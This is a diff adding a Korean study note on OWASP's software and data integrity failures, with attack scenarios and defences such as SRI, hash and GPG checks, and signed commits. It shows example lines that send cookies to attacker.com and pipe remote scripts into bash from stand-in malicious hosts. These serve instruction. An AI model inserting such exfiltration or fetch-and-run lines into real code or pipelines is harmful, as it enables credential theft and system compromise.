@@ -990,21 +990,177 @@
 
 ### 8. Software and Data Integrity Failures, 소프트웨어 및 데이터 무결성 실패
 
+: 소프트웨어 및 데이터 무결성 실패는 코드 또는 데이터가 무단으로 변경되는 보안 취약점
+
 **공격 방식**:
 
 - 코드 또는 데이터가 무단으로 변경됨
 - 악성 업데이트 파일 다운로드
+- 서드파티 리소스의 변조
+
+<br>
 
 **공격 시나리오**:
-공격자가 CDN을 해킹하여 악성 JavaScript가 포함된 라이브러리를 제공한다.
 
-**방어 방법**:
+1. 변조된 서드파티 라이브러리 로드
 
-- 코드 서명 및 무결성 검증
-- 안전한 업데이트 메커니즘 사용
+   애플리케이션이 외부 CDN에서 자바스크립트 라이브러리를 로드하는 경우,
+   공격자가 CDN을 해킹하여 악성 코드가 포함된 라이브러리를 제공할 수 있다.
+
+   ```html
+   <!-- 공격자가 변조한 악성 라이브러리 -->
+   <script src="https://cdn.example.com/jquery.min.js"></script>
+   ```
+
+   위 스크립트가 포함된 `jquery.min.js`가 공격자에 의해 변조되었다면,
+   악성코드가 실행될 수 있다.
+
+   ```javascript
+   // 공격자가 변조한 jQuery 파일 (악성 코드 추가)
+   (function () {
+     $.get("https://attacker.com/steal-cookie?data=" + document.cookie);
+   })();
+   ```
+
+   <br>
+
+   **방어 방법**:
+
+   1. Subresource Integrity(SRI) 적용
+
+      - 특정 해시 값과 일치하는 파일만 로드되도록 설정하여 무결성을 검증한다.
+      - 파일이 변경되면 로드가 차단된다.
+
+      ```html
+      <script
+        src="https://cdn.example.com/jquery.min.js"
+        integrity="sha384-o3ABX5Yk...generatedhash"
+        crossorigin="anonymous"></script>
+      ```
+
+   2. 신뢰할 수 있는 출처에서만 라이브러리 로드
+
+      - 가능하면 외부 CDN 대신 자체 서버에서 라이브러리를 관리하는 것이 안전하다.
+
+<br>
+
+2. 악성 업데이트 파일 다운로드 및 실행
+
+   사용자가 공식적인 업데이트 경로가 아닌 출처에서 업데이트를 다운로드하고 실행하면
+   공격자가 악성 업데이트를 배포할 수 있다.
+
+   ```bash
+   curl -s https://malicious-site.com/update.sh | bash
+   ```
+
+   위 명령어를 실행하면, 악성 사이트에서 다운로드한 `update.sh` 파일이 실행되며 시스템이 감염될 수 있다.
+
+   <br>
+
+   **방어 방법**:
+
+   1. 업데이트 파일의 무결성 검증(SHA256 해시 체크)
+
+      - 다운로드한 파일이 변조되지 않았는지 확인한다.
+
+      ```bash
+      wget https://trusted-site.com/update.sh
+      echo "expected_hash_value  update.sh" | sha256sum -c
+      ```
+
+   2. 업데이트 서명 검증 (GPG 서명 사용)
+
+      - 신뢰할 수 있는 소스에서 제공하는 GPG 서명을 사용하여 파일의 무결성을 검증한다.
+
+      ```bash
+      gpg --verify update.sh.sig update.sh
+      ```
+
+<br>
+
+3. 코드 저장소(repo) 변조 및 공급망 공격
+
+   공격자가 개발자의 코드 저장소(GitHub, GitLab 등)를 해킹하거나
+   의존성을 변조하여 악성 코드를 포함한 패키지를 배포할 수 있다.
+
+   ```json
+   {
+     "dependencies": {
+       "some-library": "https://malicious-site.com/some-library.tgz"
+     }
+   }
+   ```
+
+   위처럼 신뢰할 수 없는 출처에서 패키지를 다운로드하면, 악성 코드가 실행될 위험이 있다.
+
+   <br>
+
+   **방어 방법**:
+
+   1. 패키지 서명 및 무결성 검증
+
+      - npm, pip, composer 등 패키지 관리자에서 공식 서명된 패키지만 설치한다.
+
+      ```bash
+      npm audit fix
+      composer install --prefer-dist
+      ```
+
+   2. Git 저장소 보호 (Signed Commits & 2FA 사용)
+
+      - 중요한 코드 저장소는 `Signed Commits`(서명된 커밋)를 사용하여 인증한다.
+
+      ```bash
+      git commit -S -m "Secure commit"
+      ```
+
+   3. 의존성 검토 및 정기적인 보안 점검
+
+      - `npm audit`, `composer audit` 등을 실행하여 취약한 패키지가 포함되지 않았는지 점검한다.
+
+      ```bash
+      npm audit
+      composer audit
+      ```
+
+<br>
+
+4. CI/CD 파이프라인 해킹
+
+   CI/CD(Continuous Integration/Continuous Deployment) 파이프라인이 적절히 보호되지 않으면,
+   공격자가 빌드 프로세스에 악성 코드를 삽입할 수 있다.
+
+   ```yaml
+   # .github/workflows/deploy.yml
+   jobs:
+   deploy:
+      steps:
+         - name: 악성 코드 실행
+         run: curl -s https://attacker.com/malware.sh | bash
+   ```
+
+   위처럼 빌드 스크립트에 공격자가 추가한 명령이 포함되면, 배포 과정에서 악성 코드가 실행될 수 있다.
+
+   <br>
+
+   **방어 방법**:
+
+   1. CI/CD 환경에서 서명된 빌드 아티팩트만 배포
+
+      - 배포 전에 빌드 파일의 해시값을 검증하여 변조 여부를 확인한다.
+
+      ```bash
+      sha256sum build.zip
+      ```
+
+   2. CI/CD 보안 강화
+      - GitHub Actions, GitLab CI/CD 등의 보안 정책을 설정하여 승인되지 않은 사용자가 CI/CD 워크플로우를 변경하지 못하도록 한다.
+      - 빌드 서버에 다단계 인증(2FA)을 적용한다.
 
 <br>
 <br>
+
+---
 
 ### 9. Security Logging and Monitoring Failures, 보안 로깅 및 모니터링 실패
 
